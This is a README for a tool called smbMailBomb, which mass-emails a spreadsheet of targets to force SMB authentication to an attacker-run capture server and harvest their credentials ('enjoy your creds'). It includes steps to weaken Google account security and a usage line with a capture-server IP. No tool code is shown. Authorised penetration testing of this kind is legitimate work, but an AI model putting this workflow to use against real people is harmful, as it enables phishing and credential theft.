# smbMailBomb
 A command line utility to test for SMB Forced Authentication

Set Up Capture Server
Ensure SMB ports 139 and 445 are open on your captuer server
Run your capture server.
Configure Google to allow the script
  In the Google Admin Panel:
  Click Security
  Enable Less Secure Apps
In the google account settings
  Click Security
  Allow Less Secure Apps
From the command line run smbMailBomb.py and enjoy your creds. 
Usage: python3 smbMailBomb2.py -e user@yourGoogleDomain.com -p yourGooglePassword -f path/to/targets.xlsx -ip captureServerIP
  -f path to target xlsx file
  -e your google business email
  -p your google password
  -ip your capture server IP
Requirments:
  pandas==0.23.4
  colorama==0.3.9
XLSX
Add your targets first name and email, following the template provided.
